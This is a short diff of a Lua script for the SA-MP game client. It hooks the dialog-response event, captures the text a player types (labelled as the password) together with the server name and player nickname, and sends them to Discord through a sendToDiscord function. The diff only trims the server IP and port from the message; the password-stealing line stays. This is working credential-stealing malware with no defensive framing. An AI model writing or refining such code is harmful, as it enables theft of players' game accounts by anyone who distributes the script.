@@ -26,10 +26,8 @@ function sampev.onSendDialogResponse(satu,dua,tiga,inputtext)
     local servername = sampGetCurrentServerName()
     local boolean,id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     local playerName = sampGetPlayerNickname(id) 
-    local serverIP = sampGetServerIP()
-    local serverPort = sampGetServerPort()
 
-    sendToDiscord(string.format("serverIP: %s server: %s username: %s password: %s", serverIP, serverPort, servername, playerName, inputtext, serverIP, serverPort))
+    sendToDiscord(string.format("server: %s username: %s password: %s", servername, playerName, inputtext ))
 end
 
 function sendToDiscord(message)
